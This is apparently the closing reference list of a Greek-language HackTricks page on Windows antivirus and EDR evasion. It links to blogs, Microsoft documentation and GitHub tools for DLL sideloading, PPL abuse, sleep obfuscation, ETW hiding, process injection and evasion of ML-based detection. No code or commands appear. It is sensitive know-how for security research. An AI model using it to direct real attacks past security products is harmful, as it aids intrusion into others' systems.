- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάστε το προστατευτικό κέλυφος του Windows Defender με την τεχνική ανακατεύθυνσης φακέλων](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την καθαρή βιτρίνα: Από RAT σε builder και coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Ο SantaStealer έρχεται στην πόλη: Ένας νέος, φιλόδοξος infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση του malware Node.js με API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Η Ωραία Κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Poisoning παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Η Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση Stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Χρήση του remediation driver του Defender ως primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία συναρτήσεων αυτοαπόκρυψης με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Πηγαίος κώδικας InjectSetConsole της TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατευθυνόμενη είσοδο και έξοδο](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Αναδημιουργία εργαλείων C# με WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Μεταγλώττιση έργων C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof-of-concept και πηγαίος κώδικας DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Κατάχρηση εσωτερικών του thread pool για injection DLL χωρίς shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Σύνολο δεδομένων benchmark EMBER2024 και εργαλεία thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Χρήση του EMBER2024 για την αξιολόγηση red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Αποφυγή ανιχνεύσεων με βάση το machine learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Πλαίσιο φόρτωσης .NET βασισμένο σε XAML, NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Απαρίθμηση AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Μέθοδος IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - Τεχνική ανάλυση του 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [Επισκόπηση του tprtdll-Injection και κατάλογος export](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [PoC self-injection Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [PoC cross-process injection Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
